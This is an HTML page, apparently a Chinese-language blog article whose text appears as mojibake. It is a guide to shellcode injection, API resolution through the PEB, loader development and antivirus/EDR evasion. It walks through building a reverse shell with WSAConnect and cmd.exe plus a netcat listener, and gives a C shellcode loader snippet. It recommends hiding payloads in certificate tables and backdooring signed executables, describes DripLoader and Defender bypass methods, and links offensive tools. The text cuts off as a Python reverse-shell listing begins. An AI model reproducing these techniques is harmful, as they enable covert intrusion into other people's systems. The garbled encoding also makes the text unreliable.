<!doctypehtml><html lang="zh-TW"><meta name="twitter:image"content="https://wellstsai.com/single-page-conclusion/Shellcode-%E6%A0%B8%E5%BF%83%E6%8A%80%E8%A1%93-%E6%94%BB%E9%98%B2%E5%AF%A6%E6%88%B0%E6%8C%87%E5%8D%97.png"><meta name="twitter:description"content="è©³è¿° Shellcode æ³¨å…¥èˆ‡ API è§£æåŸç†ï¼Œæ¶µè“‹ PIC æŠ€è¡“ã€è¼‰å…¥å™¨é–‹ç™¼åŠ DripLoader å¯¦ä½œã€‚æä¾›é˜²æ¯’è¦é¿ç­–ç•¥èˆ‡åå‘ Shell ä»£ç¢¼ï¼ŒæŒæ¡æ ¸å¿ƒæ”»é˜²æŠ€è¡“ã€‚"><meta name="twitter:title"content="Shellcode-æ ¸å¿ƒæŠ€è¡“-æ”»é˜²å¯¦æˆ°æŒ‡å—"><meta name="twitter:card"content="summary_large_image"><meta property="og:type"content="article"><meta property="og:site_name"content="WellWells"><meta property="og:image"content="https://wellstsai.com/single-page-conclusion/Shellcode-%E6%A0%B8%E5%BF%83%E6%8A%80%E8%A1%93-%E6%94%BB%E9%98%B2%E5%AF%A6%E6%88%B0%E6%8C%87%E5%8D%97.png"><meta property="og:url"content="https://wellstsai.com/single-page-conclusion/Shellcode-%E6%A0%B8%E5%BF%83%E6%8A%80%E8%A1%93-%E6%94%BB%E9%98%B2%E5%AF%A6%E6%88%B0%E6%8C%87%E5%8D%97.html"><meta property="og:description"content="è©³è¿° Shellcode æ³¨å…¥èˆ‡ API è§£æåŸç†ï¼Œæ¶µè“‹ PIC æŠ€è¡“ã€è¼‰å…¥å™¨é–‹ç™¼åŠ DripLoader å¯¦ä½œã€‚æä¾›é˜²æ¯’è¦é¿ç­–ç•¥èˆ‡åå‘ Shell ä»£ç¢¼ï¼ŒæŒæ¡æ ¸å¿ƒæ”»é˜²æŠ€è¡“ã€‚"><meta property="og:title"content="Shellcode-æ ¸å¿ƒæŠ€è¡“-æ”»é˜²å¯¦æˆ°æŒ‡å—"><meta name="description"content="è©³è¿° Shellcode æ³¨å…¥èˆ‡ API è§£æåŸç†ï¼Œæ¶µè“‹ PIC æŠ€è¡“ã€è¼‰å…¥å™¨é–‹ç™¼åŠ DripLoader å¯¦ä½œã€‚æä¾›é˜²æ¯’è¦é¿ç­–ç•¥èˆ‡åå‘ Shell ä»£ç¢¼ï¼ŒæŒæ¡æ ¸å¿ƒæ”»é˜²æŠ€è¡“ã€‚"><meta charset="UTF-8"><meta name="viewport"content="width=device-width,initial-scale=1"><title>Shellcode æ ¸å¿ƒæŠ€è¡“èˆ‡æ”»é˜²å¯¦æˆ°æŒ‡å—</title><link rel="preconnect"href="https://fonts.googleapis.com"><link rel="preconnect"href="https://fonts.gstatic.com"crossorigin><link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=Noto+Sans+TC:wght@300;400;500;700&family=Fira+Code:wght@400;500&display=swap"rel="stylesheet"><link rel="stylesheet"href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"><script type="module">import mermaid from"https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.esm.min.mjs";mermaid.initialize({startOnLoad:!0,theme:"dark",securityLevel:"loose",fontFamily:'"Noto Sans TC", sans-serif',fontSize:16,flowchart:{curve:"basis",padding:24,nodeSpacing:80,rankSpacing:80,useMaxWidth:!0,htmlLabels:!0},themeVariables:{fontSize:"16px",fontFamily:'"Noto Sans TC", sans-serif'}})</script><script src="https://cdn.tailwindcss.com"></script><script>tailwind.config={theme:{extend:{fontFamily:{sans:["Inter","Noto Sans TC","sans-serif"],mono:["Fira Code","monospace"]},colors:{slate:{850:"#1e293b",900:"#0f172a",950:"#020617"}},animation:{"fade-in":"fadeIn 0.8s ease-out","slide-up":"slideUp 0.6s ease-out forwards"},keyframes:{fadeIn:{"0%":{opacity:"0"},"100%":{opacity:"1"}},slideUp:{"0%":{transform:"translateY(30px)",opacity:"0"},"100%":{transform:"translateY(0)",opacity:"1"}}}}}}</script><style>::-webkit-scrollbar{width:8px;height:8px}::-webkit-scrollbar-track{background:#0f172a}::-webkit-scrollbar-thumb{background:#334155;border-radius:4px}::-webkit-scrollbar-thumb:hover{background:#475569}.glass-card{background:rgba(30,41,59,.4);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);border:1px solid rgba(255,255,255,.05);box-shadow:0 8px 32px 0 rgba(0,0,0,.37);transition:all .3s ease}.glass-card:hover{border-color:rgba(56,189,248,.2);box-shadow:0 12px 40px 0 rgba(0,0,0,.6)}.code-window{background:#0d1117;border-radius:.75rem;border:1px solid #30363d;overflow:hidden}.code-header{background:#161b22;padding:.75rem 1rem;border-bottom:1px solid #30363d;display:flex;align-items:center;justify-content:space-between}.mermaid-container{background:rgba(15,23,42,.6);border-radius:.75rem;padding:1.5rem;display:flex;justify-content:center;overflow-x:auto;border:1px dashed rgba(148,163,184,.2)}.mermaid-large{min-width:100%;display:block}.mermaid-large svg{width:100%!important;height:auto!important;transform-origin:0 0}@media (min-width:768px){.mermaid-large svg{transform:scale(1.18)}}.mermaid-large .node text{font-size:16px!important;font-weight:600!important}.mermaid-large .edgeLabel,.mermaid-large .label{font-size:14px!important}ul.custom-list{list-style:none;padding-left:0}ul.custom-list li{position:relative;padding-left:1.5rem;margin-bottom:.5rem}ul.custom-list li::before{content:'â–¹';position:absolute;left:0;color:#38bdf8}strong{color:#38bdf8;font-weight:600}.section-title{display:flex;align-items:center;gap:1rem;margin-bottom:1.5rem}.section-line{height:2rem;width:4px;border-radius:2px}a{color:#38bdf8;text-decoration:none;transition:color .2s;border-bottom:1px dotted transparent}a:hover{color:#7dd3fc;border-bottom-color:#7dd3fc}</style><script async src="https://www.googletagmanager.com/gtag/js?id=G-JKC4KZLT26"></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-JKC4KZLT26")</script><body class="bg-slate-950 min-h-screen text-slate-300 font-sans antialiased selection:bg-sky-500/30 selection:text-sky-200 overflow-x-hidden"><div class="fixed top-0 left-0 w-full h-full overflow-hidden -z-10 pointer-events-none"><div class="absolute top-[-20%] right-[-10%] w-[50%] h-[50%] rounded-full bg-indigo-900/20 blur-[120px]"></div><div class="absolute bottom-[-20%] left-[-10%] w-[50%] h-[50%] rounded-full bg-sky-900/10 blur-[120px]"></div></div><main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12 space-y-20"><header class="text-center space-y-6 animate-fade-in pt-10"><div class="inline-flex items-center justify-center w-16 h-16 rounded-2xl bg-gradient-to-br from-slate-800 to-slate-900 border border-slate-700 shadow-2xl mb-4"><i class="fa-solid fa-code text-3xl text-sky-400"></i></div><h1 class="text-4xl md:text-5xl font-extrabold text-transparent bg-clip-text bg-gradient-to-r from-sky-200 via-white to-indigo-200 tracking-tight leading-tight">Shellcode æ ¸å¿ƒæŠ€è¡“èˆ‡æ”»é˜²å¯¦æˆ°æŒ‡å—</h1><p class="text-lg text-slate-400 max-w-3xl mx-auto font-light">æ·±å…¥æ¢è¨è¨˜æ†¶é«”æ³¨å…¥ã€API è§£æã€è¼‰å…¥å™¨é–‹ç™¼åŠé«˜éšè¦é¿æŠ€è¡“çš„å®Œæ•´æŠ€è¡“æ‰‹å†Šã€‚</header><section class="animate-slide-up"><div class="section-title"><div class="section-line bg-sky-500"></div><h2 class="text-3xl font-bold text-white">Shellcode ç°¡ä»‹</h2></div><div class="glass-card rounded-2xl p-8"><p class="text-slate-300 leading-relaxed text-lg">Shellcode æ˜¯ä¸€ç¨®æ©Ÿå™¨ç¢¼ï¼ˆMachine Codeï¼‰ï¼Œç•¶è¢«æ³¨å…¥åˆ°ç›®æ¨™è™•ç†åºï¼ˆProcessï¼‰çš„è¨˜æ†¶é«”ä¸­æ™‚ï¼ŒæœƒåŸ·è¡Œç‰¹å®šçš„æ“ä½œã€‚å®ƒé€šå¸¸ä½œç‚ºæ¼æ´åˆ©ç”¨ï¼ˆExploitsï¼‰ä¸­çš„æœ‰æ•ˆè¼‰è·ï¼ˆPayloadï¼‰ï¼ŒåŸ·è¡Œè«¸å¦‚é–‹å•Ÿå‘½ä»¤åˆ— Shellã€å»ºç«‹ç¶²è·¯é€£ç·šæˆ–åŸ·è¡Œä»»æ„æŒ‡ä»¤ç­‰å‹•ä½œã€‚</div></section><section class="animate-slide-up"style="animation-delay:.1s"><div class="section-title"><div class="section-line bg-blue-500"></div><h2 class="text-3xl font-bold text-white">Shellcode åŸºæœ¬æ¦‚å¿µ</h2></div><div class="grid grid-cols-1 gap-8"><div class="glass-card rounded-2xl p-8"><h3 class="text-xl font-bold text-white mb-4 flex items-center gap-2"><i class="fa-solid fa-microchip text-sky-400"></i> Shellcode åŸ·è¡Œæ¨¡å¼</h3><p class="mb-4 text-slate-400">Shellcode æ³¨å…¥é€šå¸¸éµå¾ªã€Œé…ç½®-å¯«å…¥-åŸ·è¡Œã€ï¼ˆAllocate-Write-Executeï¼‰æ¨¡å¼ï¼š<ol class="list-decimal list-inside space-y-2 mb-6 text-slate-300 ml-2"><li>é…ç½®å¤§å°èˆ‡ Shellcode ç›¸ç¬¦çš„ RWXï¼ˆå¯è®€å¯å¯«å¯åŸ·è¡Œï¼‰è¨˜æ†¶é«”ã€‚<li>å°‡ Shellcode å¯«å…¥é…ç½®çš„è¨˜æ†¶é«”ä¸­ã€‚<li>åŸ·è¡Œå·²é…ç½®è¨˜æ†¶é«”ä¸­çš„å…§å®¹ã€‚</ol><div class="bg-red-900/20 border border-red-500/30 p-4 rounded-lg"><p class="text-red-200 text-sm font-semibold mb-2"><i class="fa-solid fa-triangle-exclamation mr-2"></i> OPSEC è­¦å‘Š<p class="text-red-100/80 text-sm">æ‡‰é¿å…ç›´æ¥ä½¿ç”¨ <code>PAGE_EXECUTE_READWRITE</code> é€²è¡Œé…ç½®ï¼Œå› ç‚ºé€™å¾ˆå®¹æ˜“è¢«æ¨™è¨˜ç‚ºå¯ç–‘ã€‚è¼ƒä½³çš„åšæ³•æ˜¯ï¼š<ol class="list-decimal list-inside text-red-100/80 text-sm mt-2 ml-2"><li>ä½¿ç”¨ <code>PAGE_READWRITE</code> é€²è¡Œé…ç½®ã€‚<li>å¯«å…¥æœ‰æ•ˆè¼‰è·ï¼ˆPayloadï¼‰ã€‚<li>å°‡è¨˜æ†¶é«”ä¿è­·å±¬æ€§æ›´æ”¹ç‚ºå¯åŸ·è¡Œï¼ˆExecutableï¼‰ã€‚</ol></div></div><div class="glass-card rounded-2xl p-8"><h3 class="text-xl font-bold text-white mb-4 flex items-center gap-2"><i class="fa-solid fa-arrows-to-dot text-sky-400"></i> ä½ç½®ç„¡é—œç¨‹å¼ç¢¼ï¼ˆPICï¼‰æŠ€è¡“</h3><div class="mermaid-container"><div class="mermaid mermaid-large">flowchart TB PIC["ä½ç½®ç„¡é—œç¨‹å¼ç¢¼ (PIC)"] GetRIP["ç²å–ç›®å‰ä½å€ (RIP)"] Delta["è¨ˆç®—åç§»é‡ (Delta)"] Relative["ä½¿ç”¨ç›¸å°å®šå€"] Hashing["API é›œæ¹Š (Hashing)"] PIC --> GetRIP PIC --> Delta PIC --> Relative PIC --> Hashing subgraph "Windows æŠ€è¡“" CallPop["Call/Pop æ–¹æ³•"] FPU["FPU ç‹€æ…‹æ–¹æ³•"] SEH["SEH æ–¹æ³•"] end subgraph "Linux æŠ€è¡“" GOT["å…¨åŸŸåç§»è¡¨ (GOT)"] VS["VSyscall/VDSO"] end GetRIP --> CallPop GetRIP --> FPU GetRIP --> SEH GetRIP --> GOT GetRIP --> VS</div></div></div></div></section><section class="animate-slide-up"style="animation-delay:.2s"><div class="section-title"><div class="section-line bg-purple-500"></div><h2 class="text-3xl font-bold text-white">Shellcode é–‹ç™¼æµç¨‹</h2></div><div class="glass-card rounded-2xl p-8"><div class="mermaid-container mb-6"><div class="mermaid">flowchart TB Concept["æ¦‚å¿µèˆ‡éœ€æ±‚"] Assembly["çµ„åˆèªè¨€ç¨‹å¼ç¢¼"] Extraction["äºŒé€²ä½æå–"] Testing["æ¸¬è©¦èˆ‡é™¤éŒ¯"] Optimization["æœ€ä½³åŒ–"] Encoding["ç·¨ç¢¼èˆ‡æ··æ·†"] Delivery["å‚³éæ–¹å¼"] Concept --> Assembly Assembly --> Extraction Extraction --> Testing Testing --> Optimization Optimization --> Encoding Encoding --> Delivery subgraph "é–‹ç™¼éšæ®µ" Assembly Extraction Testing Optimization end subgraph "è¦é¿éšæ®µ" Encoding end subgraph "æ¼æ´åˆ©ç”¨éšæ®µ" Delivery end</div></div></div></section><section class="animate-slide-up"style="animation-delay:.3s"><div class="section-title"><div class="section-line bg-emerald-500"></div><h2 class="text-3xl font-bold text-white">Windows Shellcode æ©Ÿåˆ¶</h2></div><div class="space-y-8"><div class="glass-card rounded-2xl p-8"><h3 class="text-xl font-bold text-white mb-6">Windows Shellcode çš„ API è§£ææµç¨‹</h3><div class="grid grid-cols-1 md:grid-cols-2 gap-8"><div><p class="text-slate-400 mb-4">è­˜åˆ¥ <code>kernel32.dll</code> èˆ‡è§£æå‡½æ•¸çš„å®Œæ•´éç¨‹ï¼š<ul class="custom-list text-sm text-slate-300 space-y-2"><li>å–å¾— <code>PEB->Ldr.InMemoryOrderModuleList</code>ã€‚<li>è¿­ä»£éæ­· <code>InMemoryOrderModuleList</code>ï¼›åœ¨ Win10/11+ é †åºé€šå¸¸ç‚ºï¼šexe æœ¬èº« â†’ <code>ntdll.dll</code> â†’ <code>kernel32.dll</code>ã€‚é€éåç¨±é›œæ¹Šæ¯”å°å®šä½ã€‚<li>è§£æåŒ¯å‡ºä½å€è¡¨ï¼ˆExport Address Table, EATï¼‰ã€‚<li>è¿´åœˆéæ­· EAT å°‹æ‰¾ <code>GetProcAddress</code> çš„åç¨±ã€‚<li>å–å¾—å‡½æ•¸åºè™Ÿï¼ˆOrdinalï¼‰å¾Œå–å¾—ä½å€ï¼ˆç²å¾— <code>GetProcAddress</code> æ¬Šé™ï¼‰ã€‚<li>åœ¨è§£æ <code>LoadLibraryA</code> å‰ç¢ºä¿ <code>GetProcAddress</code> å¯ç”¨ï¼›å…©è€…å¯åœ¨åŒä¸€åˆ—èˆ‰è¿´åœˆç²å–ã€‚<li>ä½¿ç”¨ <code>GetProcAddress</code> è§£æ <code>LoadLibraryA</code> ä¸¦è¼‰å…¥ <code>WS2_32.dll</code>ã€‚<li>å–å¾—ä¸¦å‘¼å« <code>WSAStartup</code>ã€‚<li>æŸ¥è©¢ <code>WSASocketA</code> å»ºç«‹ Socketã€‚<li>æŸ¥è©¢ <code>WSAConnect</code> é€£ç·šåˆ°è©² Socketã€‚<li>å†æ¬¡å¾ <code>kernel32.dll</code> æ‰¾åˆ° <code>CreateProcessA</code>ã€‚<li>å°‡ <code>cmd.exe</code> æ¨å…¥å †ç–Šï¼Œå¡«å…… <code>STARTUPINFOA</code> ä¸¦å‘¼å« <code>CreateProcessA</code>ã€‚<li>æœ¬åœ°ç›£è½ï¼š<code>nc -nvv -p 443 -l</code>ã€‚</ul></div><div class="flex flex-col gap-4"><div class="code-window h-full"><div class="code-header"><span class="text-xs text-slate-400 font-mono">WinDbg Commands</span><div class="flex gap-1.5"><div class="w-2.5 h-2.5 rounded-full bg-red-500"></div><div class="w-2.5 h-2.5 rounded-full bg-yellow-500"></div><div class="w-2.5 h-2.5 rounded-full bg-green-500"></div></div></div><div class="p-4 overflow-x-auto text-xs font-mono text-slate-300 bg-slate-900 h-full"><pre># å–å¾— PEB ä½å€
dt nt!_TEB -y ProcessEnvironmentBlock @$teb

# å–å¾— Ldr ä½å€
dt nt!_PEB -y Ldr &lt;peb_addr&gt;

# åˆ—å‡ºå·²è¼‰å…¥æ¨¡çµ„çš„éˆçµä¸²åˆ—
dt -r _PEB_LDR_DATA &lt;ldr_addr&gt;

# DllBase å’Œ FullDllName é€™è£¡æœƒå¾ˆæœ‰ç”¨
dt _LDR_DATA_TABLE_ENTRY (&lt;intialization_flink_addr&gt; - 0x10)

# åŸ·è¡Œä¸‹æ–¹çš„ Python ç¨‹å¼ç¢¼å¾Œé€²è¡Œé©—è­‰
lm m kernel32
r @r8</pre></div></div></div></div></div><div class="glass-card rounded-2xl p-8"><h3 class="text-xl font-bold text-white mb-6">Shellcode åŸ·è¡Œæµç¨‹ (Windows)</h3><div class="mermaid-container"><div class="mermaid mermaid-large">flowchart LR Entry["å…¥å£é»"] GetPEB["å–å¾— PEB ä½å€"] LocateKernel["å®šä½ kernel32.dll"] FindFunction["å°‹æ‰¾ API å‡½æ•¸"] Payload["åŸ·è¡Œæœ‰æ•ˆè¼‰è·"] Cleanup["æ¸…ç†èˆ‡é€€å‡º"] Entry --> GetPEB GetPEB --> LocateKernel LocateKernel --> FindFunction FindFunction --> Payload Payload --> Cleanup subgraph "API è§£æ" GetPEB LocateKernel FindFunction end subgraph "æ ¸å¿ƒåŠŸèƒ½" Payload Cleanup end</div></div></div></div></section><section class="animate-slide-up"style="animation-delay:.4s"><div class="section-title"><div class="section-line bg-amber-500"></div><h2 class="text-3xl font-bold text-white">Shellcode è¼‰å…¥å™¨ (Loaders)</h2></div><div class="space-y-8"><div class="glass-card rounded-2xl p-8"><h3 class="text-xl font-bold text-white mb-4">åŸºæœ¬æ¨¡å¼</h3><div class="code-window mb-6"><div class="code-header"><span class="text-xs text-slate-400 font-mono">C / C++</span></div><div class="p-4 overflow-x-auto font-mono text-sm text-slate-300"><pre><span class="text-purple-400">char</span> *shellcode = <span class="text-green-400">"\xAA\xBB..."</span>;
<span class="text-purple-400">char</span> *dest = <span class="text-yellow-300">VirtualAlloc</span>(NULL, 0x1234, 0x3000, p_RW);
<span class="text-yellow-300">memcpy</span>(dest, shellcode, 0x1234);
<span class="text-yellow-300">VirtualProtect</span>(dest, 0x1234, p_RX, &result);
(*(<span class="text-purple-400">void</span>(*)())(dest))();  <span class="text-slate-500">// è·³è½‰è‡³ destï¼šåŸ·è¡Œ shellcode</span></pre></div></div><h4 class="text-lg font-bold text-amber-400 mb-2">èªè­˜ Shellcode è¼‰å…¥å™¨</h4><p class="text-slate-400 text-sm mb-4">è¼‰å…¥å™¨è² è²¬å°‡ Shellcode ä½œç‚ºè¼¸å…¥ï¼Œé©—è­‰ç’°å¢ƒï¼ˆAnti-Sandboxï¼‰ï¼Œè§£å¯†ä¸¦å®‰å…¨æ³¨å…¥ã€‚å®ƒå¯èƒ½å­˜åœ¨æ–¼è™•ç†åºæ¨¹æˆ–æ¨¡çµ„åˆ—è¡¨ä¸­ã€‚<div class="flex flex-wrap gap-2 mb-4"><span class="px-3 py-1 bg-slate-800 rounded text-xs text-slate-300 border border-slate-700">Rust (å®‰å…¨ä½†é«”ç©å¤§)</span> <span class="px-3 py-1 bg-slate-800 rounded text-xs text-slate-300 border border-slate-700">Nim</span> <span class="px-3 py-1 bg-slate-800 rounded text-xs text-slate-300 border border-slate-700">Go (ç‰¹å¾µæ˜é¡¯)</span> <span class="px-3 py-1 bg-slate-800 rounded text-xs text-slate-300 border border-slate-700">Zig (é«”ç©å°/ç„¡ä¾è³´)</span></div></div><div class="grid grid-cols-1 md:grid-cols-3 gap-6"><div class="glass-card rounded-2xl p-6"><h4 class="text-lg font-bold text-sky-400 mb-3">1. é…ç½®éšæ®µ (Allocation)</h4><ul class="custom-list text-sm text-slate-400"><li><strong>ç›®æ¨™ï¼š</strong>æ–°è¨˜æ†¶é«”å€åŸŸã€Code cavesã€Stack/Heapã€‚<li><strong>æŠ€è¡“ï¼š</strong><code>VirtualAllocEx</code>, <code>NtAllocateVirtualMemory</code>, <code>ZwCreateSection</code>ã€‚<li><strong>æœ€ä½³å¯¦è¸ï¼š</strong>é…ç½® RW â†’ å¯«å…¥ â†’ åˆ‡æ›ç‚º RX (é¿å…ç›´æ¥ RWX)ã€‚</ul></div><div class="glass-card rounded-2xl p-6"><h4 class="text-lg font-bold text-sky-400 mb-3">2. å¯«å…¥éšæ®µ (Write)</h4><ul class="custom-list text-sm text-slate-400"><li><strong>æŠ€è¡“ï¼š</strong><code>WriteProcessMemory</code>, <code>NtWriteVirtualMemory</code>, <code>memcpy</code>ã€‚<li><strong>è¦é¿ç­–ç•¥ï¼š</strong><ul class="pl-4 mt-1 text-xs text-slate-500 space-y-1"><li>- å‰ç½®ç„¡ç”¨æ“ä½œç¢¼ (Dummy opcodes)<li>- åˆ†å¡Š (Chunks) éš¨æ©Ÿé †åºå¯«å…¥<li>- åŠ å…¥å¯«å…¥å»¶é²</ul></ul></div><div class="glass-card rounded-2xl p-6 border-l-4 border-l-red-500"><h4 class="text-lg font-bold text-red-400 mb-3">3. åŸ·è¡Œéšæ®µ (Execute)</h4><p class="text-xs text-slate-500 mb-2">æœ€è„†å¼±çš„æ­¥é©Ÿï¼ŒEDR é‡é»ç›£æ§ã€‚<ul class="custom-list text-sm text-slate-400 mb-4"><li><code>CreateRemoteThread</code><li><code>NtSetContextThread</code> / <code>NtQueueApcThreadEx</code><li>API Hooks / Trampolines</ul><div class="bg-slate-800/50 p-3 rounded-lg"><p class="text-xs font-bold text-slate-300 mb-2">é–“æ¥åŸ·è¡ŒæŠ€è¡“ï¼š<div class="flex flex-col gap-1 text-xs"><a href="https://github.com/Wra7h/FlavorTown"target="_blank">ğŸ”— FlavorTown</a> <a href="https://github.com/aahmad097/AlternativeShellcodeExec"target="_blank">ğŸ”— AlternativeShellcodeExec</a> <a href="https://github.com/caueb/ThreadlessC"target="_blank">ğŸ”— ThreadLess</a></div></div></div></div><div class="glass-card rounded-2xl p-8"><h3 class="text-xl font-bold text-white mb-4">Exec/DLL è½‰æ›èˆ‡å·¥å…·</h3><div class="grid grid-cols-1 md:grid-cols-2 gap-8"><div><h4 class="text-sm font-bold text-indigo-400 mb-2">è½‰æ›å·¥å…·</h4><ul class="custom-list text-sm text-slate-400 space-y-1"><li><a href="https://github.com/TheWover/donut/tree/master"target="_blank">Donut</a> - PE (EXE/DLL) è½‰ Shellcode<li><a href="https://github.com/monoxgas/sRDI"target="_blank">sRDI</a> - DLL è½‰ PIC Shellcode<li><a href="https://github.com/hasherezade/pe_to_shellcode"target="_blank">Pe2shc</a> - PE è½‰ Shellcode<li><a href="https://github.com/EgeBalci/amber"target="_blank">Amber</a> - åå°„å¼ PE åŠ æ®¼</ul></div><div><h4 class="text-sm font-bold text-pink-400 mb-2">é–‹æºè¼‰å…¥å™¨</h4><ul class="custom-list text-sm text-slate-400 space-y-1"><li><a href="https://github.com/optiv/ScareCrow"target="_blank">ScareCrow</a> / <a href="https://github.com/chvancooten/NimPackt-v1"target="_blank">NimPackt-v1</a><li><a href="https://github.com/specterops/NullGate"target="_blank">NullGate</a> (Indirect syscalls & Junk-write)<li><a href="https://github.com/cryptomancer/ghost"target="_blank">Ghost</a> (Fiber spoofing & ETW patch)<li><a href="https://github.com/epi052/ThreadlessInject"target="_blank">ThreadlessInject</a> (ç„¡æ–°åŸ·è¡Œç·’)<li><a href="https://github.com/mgeeky/ProtectMyTooling"target="_blank">ProtectMyTooling</a> (ä¸²æ¥ä¿è­·)</ul></div></div></div></div></section><section class="animate-slide-up"style="animation-delay:.5s"><div class="section-title"><div class="section-line bg-gray-500"></div><h2 class="text-3xl font-bold text-white">è·¨å¹³å°è€ƒé‡</h2></div><div class="grid grid-cols-1 md:grid-cols-3 gap-6"><div class="glass-card rounded-2xl p-6"><h3 class="text-lg font-bold text-white mb-2"><i class="fa-brands fa-windows mr-2"></i>Windows on ARM64</h3><p class="text-sm text-slate-400">Snapdragon X Elite / Surface Pro 10ã€‚Syscalls ä½¿ç”¨ <code>SVC 0</code> èˆ‡ <code>ntdll!KiServiceTableArm64</code>ã€‚æ³¨æ„ PAC (æŒ‡æ¨™é©—è­‰) ç°½ç½² LR å€¼ï¼Œé¿å… Stack pivotsã€‚</div><div class="glass-card rounded-2xl p-6"><h3 class="text-lg font-bold text-white mb-2"><i class="fa-brands fa-linux mr-2"></i>Linux 6.9+</h3><p class="text-sm text-slate-400">å¼•å…¥ BPF Tokens èˆ‡å…±äº« <strong>BPF Arena</strong> (å¯åŸ·è¡Œ)ã€‚å°‡ Shellcode è—åœ¨ Arena map ä¸­ï¼Œé€é <code>bpf_prog_run_pin_on_cpu</code> åŸ·è¡Œã€‚</div><div class="glass-card rounded-2xl p-6"><h3 class="text-lg font-bold text-white mb-2"><i class="fa-brands fa-apple mr-2"></i>macOS SSV</h3><p class="text-sm text-slate-400">ç³»çµ±å·å¯†å°ã€‚æŒä¹…åŒ–éœ€å»ºç«‹ Snapshotã€æ³¨å…¥ä¸¦é‡ç°½ (kmutil)ã€‚ä½¿ç”¨è€…ç©ºé–“å‰‡åˆ©ç”¨ Launch Agents æˆ– dylib åŠ«æŒã€‚</div></div></section><section class="animate-slide-up"style="animation-delay:.6s"><div class="section-title"><div class="section-line bg-red-500"></div><h2 class="text-3xl font-bold text-white">å„²å­˜ã€éš±è—èˆ‡è¦é¿æŠ€è¡“</h2></div><div class="grid grid-cols-1 lg:grid-cols-2 gap-8 mb-8"><div class="glass-card rounded-2xl p-8"><h3 class="text-xl font-bold text-white mb-4">å„²å­˜é¸é …</h3><ul class="custom-list text-sm text-slate-400 space-y-2"><li><strong>å¯«æ­» (Hardcoded)ï¼š</strong>å­˜æ–¼ RW/RO å€æ®µï¼Œéœ€é‡æ–°ç·¨è­¯ã€‚<li><strong>PE è³‡æºï¼š</strong>RCDATA Blobs (AV é‡é»æƒæ)ã€‚<li><strong>é¡å¤– PE å€æ®µï¼š</strong>å€’æ•¸ç¬¬ N å€‹ R+X å€æ®µã€‚<li><strong>ç¶²è·¯ç²å–ï¼š</strong>å¦‚ CSharpShooterã€‚<li><strong>è­‰æ›¸è¡¨ (Certificate Table) â˜…æ¨è–¦ï¼š</strong>å¡«å…… PE ç°½ç« å€å¡Šï¼Œä¿æŒä¸»ç¨‹å¼ç°½ç« å®Œæ•´ (å¦‚ Teams.exe)ï¼Œåƒ…ç ´å£ä¾è³´ DLL (å¦‚ ffmpeg.dll)ã€‚<li><strong>åˆæ³• PE å¾Œé–€ï¼š</strong>æ¤å…¥ Shellcode èˆ‡ Loaderã€‚</ul><div class="mt-4 p-3 bg-slate-800 rounded border border-slate-700"><span class="text-xs font-bold text-slate-300">ä¿è­·æ–¹æ³•ï¼š</span> <span class="text-xs text-slate-400">å£“ç¸® (LZMA) + åŠ å¯† (XOR32/RC4/AES)</span></div></div><div class="glass-card rounded-2xl p-8"><h3 class="text-xl font-bold text-white mb-4">è¦é¿æŠ€è¡“ (Evasion)</h3><div class="space-y-4"><div><h4 class="text-sm font-bold text-sky-400">æ¼¸é€²å¼è¦é¿ç­–ç•¥</h4><ol class="list-decimal list-inside text-sm text-slate-400 ml-2"><li>åŸºæœ¬åŸ·è¡Œ<li>åŠ å¯†/æ··æ·†<li>ç›´æ¥ç³»çµ±å‘¼å« (Direct Syscalls)<li>é ç«¯ç¨‹åºæ³¨å…¥ (Remote Injection)</ol></div><div><h4 class="text-sm font-bold text-green-400">Windows Defender è¦é¿å·¥å…·</h4><p class="text-xs text-slate-500 mb-1"><a href="https://github.com/hackmosphere/DefenderBypass"target="_blank">ğŸ”— DefenderBypass</a><ul class="text-xs text-slate-400 list-disc list-inside ml-2"><li>myEncoder3.py (XOR)<li>InjectSyscall-LocalProcess.cpp (Direct Syscalls, IAT cleanup)<li>Win11 24H2 AMSI å †ç©æƒææ‡‰å°ï¼š<code>PAGE_NOACCESS</code> â†’ è§£å¯† â†’ <code>PAGE_EXECUTE_READ</code>ã€‚</ul></div><div><h4 class="text-sm font-bold text-red-400">æœ¬åœ° vs é ç«¯æ³¨å…¥</h4><p class="text-xs text-slate-400">é ç«¯æ³¨å…¥é¢è‡¨ CFG, CIG, ETW ç›£æ§ã€‚åµæ¸¬é»åŒ…å« ETW Ti, EDR Hooks, ä»¥åŠå›æº¯åŸ·è¡Œç·’å‘¼å«å †ç–Š (Call Stack)ã€‚</div></div></div></div><div class="glass-card rounded-2xl p-8 mb-8"><h3 class="text-xl font-bold text-white mb-4">é€²éšå¯¦ä½œï¼šDripLoader æŠ€è¡“</h3><p class="text-sm text-slate-400 mb-2">ç¨‹å¼ç¢¼ä¾†æºï¼š<a href="https://github.com/xuanxuan0/DripLoader"target="_blank">github.com/xuanxuan0/DripLoader</a><ul class="custom-list text-sm text-slate-400 grid grid-cols-1 md:grid-cols-2 gap-2"><li>ä½¿ç”¨ <code>NO_ACCESS</code> ä¿ç•™å¤§å¡Šè¨˜æ†¶é«”ã€‚<li>åœ¨ä¿ç•™æ± ä¸­é…ç½®åˆ†æ•£çš„ 4KB <code>Read+Write</code> å€å¡Šã€‚<li>åˆ†å¡Šéš¨æ©Ÿé †åºå¯«å…¥ Shellcodeã€‚<li>é‡æ–°ä¿è­·ç‚º <code>Read+Exec</code>ã€‚<li>è¦†å¯« <code>ntdll!RtlpWow64CtxFromAmd64</code> åºè¨€ä½œç‚º JMP è·³æ¿ã€‚<li>ä½¿ç”¨ Direct Syscalls (NtAllocateVirtualMemory ç­‰)ã€‚</ul></div></section><section class="animate-slide-up"style="animation-delay:.7s"><div class="section-title"><div class="section-line bg-slate-400"></div><h2 class="text-3xl font-bold text-white">å¯¦ä½œç¯„ä¾‹</h2></div><div class="glass-card rounded-2xl p-1 overflow-hidden"><div class="bg-slate-900 p-4 border-b border-slate-800 flex justify-between items-center"><h3 class="font-bold text-white text-sm">åå‘ Shell (Reverse Shell) Shellcode å¯¦ä½œ</h3><span class="text-xs text-slate-500">Python</span></div><div class="p-0 overflow-x-auto"><div class="code-window rounded-none border-0"><div class="p-6 font-mono text-xs text-slate-300 leading-relaxed"><pre><span class="text-purple-400">import</span> ctypes, 